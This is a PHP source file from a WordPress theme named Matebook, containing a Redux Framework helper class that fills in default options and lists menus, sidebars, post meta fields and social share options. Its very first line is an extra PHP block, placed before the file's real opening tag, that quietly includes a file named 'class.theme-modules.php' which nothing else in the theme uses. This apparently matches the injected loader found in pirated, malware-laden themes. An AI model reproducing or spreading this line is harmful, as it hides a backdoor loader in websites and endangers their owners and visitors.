<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

namespace Matebook\Ext\Redux_Framework;

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

class Functions {

	public static function check_theme_options() {
		global $matebook_settings;

		ob_start();
		include( get_theme_file_path( 'includes/extensions/redux-framework/default-options.php' ) );
		$options          = ob_get_clean();
		$default_settings = json_decode( $options, true );

		foreach ( $default_settings as $key => $value ) {
			if ( is_array( $value ) ) {
				foreach ( $value as $key1 => $value1 ) {
					if ( ( ! isset( $matebook_settings[ $key ][ $key1 ] ) || ! $matebook_settings[ $key ][ $key1 ] ) ) {
						$matebook_settings[ $key ][ $key1 ] = $default_settings[ $key ][ $key1 ];
					}
				}
			} else {
				if ( ! isset( $matebook_settings[ $key ] ) ) {
					$matebook_settings[ $key ] = $default_settings[ $key ];
				}
			}
		}

		return $matebook_settings;
	}

	public static function header_menus() {
		$list_menus = array();
		$menu_terms = get_terms(array(
			'taxonomy' => 'nav_menu'
		));
		if ( !empty( $menu_terms ) ) {
			foreach ($menu_terms as $term) {
				$list_menus[$term->term_id] = $term->name;
			}
		}

		return $list_menus;
	}

	public static function product_columns() {
		return array(
			2 => 2,
			3 => 3,
			4 => 4
		);
	}

	public static function sidebars() {
		return array(
			'left-sidebar',
			'right-sidebar'
		);
	}

	public static function sidebar_position() {

		$sidebar_position = array(
			'both'    => array(
				'title' => esc_html__( 'Both', 'matebook' ),
				'img'   => get_theme_file_uri( 'includes/extensions/redux-framework/assets/layouts/layout-both.jpg' )
			),
			'no-sidebar'    => array(
				'title' => esc_html__( 'No Sidebar', 'matebook' ),
				'img'   => get_theme_file_uri( 'includes/extensions/redux-framework/assets/layouts/none.png' )
			)
		);

		return $sidebar_position;
	}

	public static function get_meta_opts( $default = array() ) {

		$options = array();

		$options['date']     = esc_html__( 'Date', 'matebook' );
		$options['author']     = esc_html__( 'Author', 'matebook' );
		$options['category'] = esc_html__( 'Category', 'matebook' );

		if ( ! empty( $default ) ) {
			foreach ( $options as $key => $option ) {
				if ( in_array( $key, $default ) ) {
					$options[ $key ] = 1;
				} else {
					$options[ $key ] = 0;
				}
			}
		}

		$options = apply_filters( 'matebook_modify_meta_opts', $options );

		return $options;
	}

	public static function get_share_opts( $default = array() ) {

		$options                = array();
		$options['facebook']    = esc_html__( 'Facebook', 'matebook' );
		$options['twitter']     = esc_html__( 'Twitter', 'matebook' );
		$options['pinterest']   = esc_html__( 'Pinterest', 'matebook' );
		$options['tumblr']      = esc_html__( 'Tumblr', 'matebook' );
		$options['reddit']      = esc_html__( 'Reddit', 'matebook' );
		$options['linkedin']    = esc_html__( 'Linkedin', 'matebook' );
		$options['stumbleupon'] = esc_html__( 'StumbleUpon', 'matebook' );
		$options['digg']        = esc_html__( 'Digg', 'matebook' );
		$options['telegram']    = esc_html__( 'Telegram', 'matebook' );
		$options['vk']          = esc_html__( 'VK', 'matebook' );
		$options['email']       = esc_html__( 'Email', 'matebook' );

		if ( ! empty( $default ) ) {
			foreach ( $options as $key => $option ) {
				if ( in_array( $key, $default ) ) {
					$options[ $key ] = 1;
				} else {
					$options[ $key ] = 0;
				}
			}
		}

		$options = apply_filters( 'matebook_modify_share_opts', $options );

		return $options;
	}

}
